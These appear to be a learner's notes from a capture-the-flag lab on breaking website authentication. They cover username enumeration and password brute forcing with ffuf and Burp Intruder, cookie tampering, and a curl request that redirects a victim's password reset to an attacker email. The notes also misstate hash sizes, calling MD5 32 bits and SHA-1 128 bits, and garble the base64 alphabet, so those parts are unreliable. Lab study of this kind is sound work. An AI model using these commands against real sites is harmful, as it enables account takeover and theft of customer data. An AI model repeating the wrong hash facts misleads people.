- Authentication Baypas =>
	In this room, we will learn about different ways website authentication methods can be bypassed, defeated or broken. These vulnerabilities can be some of the most critical as it often ends in leaks of customers personal data.
	
1. User Enumeration:
	-  Error messages are helpful in such situations, if you have a signup form, and enter a username calleed admin and 
	an error message appeare "This username already exists", we can make a list of valid usernames in this web app, we can user fuff or burp intruder to do so.

		- Using Burp intruder:
			First you will intersept a fake signup request, and send it to the intruder, after that you select the username as a variable (to change every request), then you will load a wordlist with a common usernames used, you can find one in `~/Desktop/tools/SecLists/Usernames/Names/name.txt`, 
			add the error you need to match and launch your attack, it will take very long time if you don't have a pro version.

		- Using ffuf:
			in our case we wanna send usernmae, email, password and cpassword, to do this we use the following ffuf command
				`ffuf -w ~/SecLists/Usernames/Names/names.txt -u 'URL' -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -mr "username already exists"`

			-w => wordlist
			-u => url
			-X => request method
			-d => data to be sent
			-H => to add extra headers
			-mr => match some words in the response body

2. Brute Force
	- After we made a list of valid usernames, we now need to brute force to login to the wep app, we can do it using ffuf:
		`ffuf -w valid_users.txt:W1,/home/kali/Desktop/tools/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -u http://10.10.143.79/customers/login -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -fc 200`

		-fc => to check for http status code other than 200,because if the username and the passwords matched, you will redirected your account, that means the http status code would be 302

3. Logic Flaw
	- in the previous method we logrd in using brute forcing, but know we can bypass the authentication proccess.
	- What is logic flaw?
		Sometimes authentication processes contain logic flaws. A logic flaw is when the typical logical path of an application is either bypassed, circumvented or manipulated by a hacker. Logic flaws can exist in any area of a website, but we're going to concentrate on examples relating to authentication in this instance.

		for normal users you must take this path to login for example:

		step1 => step2 => step3 => step4

		but the  hacker can go directly from

		step1 => step4
		by sendinng a request like this, assuming we know the target email and username, we enterd to reset the password
		`curl 'http://10.10.143.79/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'`

4. Cookie Tampering
	Cookie may be either palin text or hashed, we can edit, modify and even delete it using:
		1. inspect => storage 
		2. Cookies editor extension
		3. curl requests
		4. burpsuit interceptor
	# Hashing => Is an irreversible representation of the original text, a one way function.
	There are many methods of hashing such as:
		- md5 => represented in 32-bits
		- sha256 => represented in 256-bits
		- sha512 => represented in 512-bits
		- sha1 => represented in 128-bits
			You can see from the above table that the hash output from the same input string can significantly differ depending on the hash method in use. Even though the hash is irreversible, the same output is produced every time, which is helpful for us as services such as https://crackstation.net/ keep databases of billions of hashes and their original strings.
	# Encodeing => Is similer to hashing but encoding is reversible
		What is the point in encoding? Encoding allows us to convert binary data into human-readable text that can be easily and safely transmitted over mediums that only support plain text ASCII characters.
			- There are several types of encoding such:
				1. base32 => converts binary data to the characters A-Z and 2-7
				2. base64 => converts binary data to the characters A-z, a-z, 0-9,+,/,=
					= is used for padding

=====================
	Alhamdullah
=====================

        






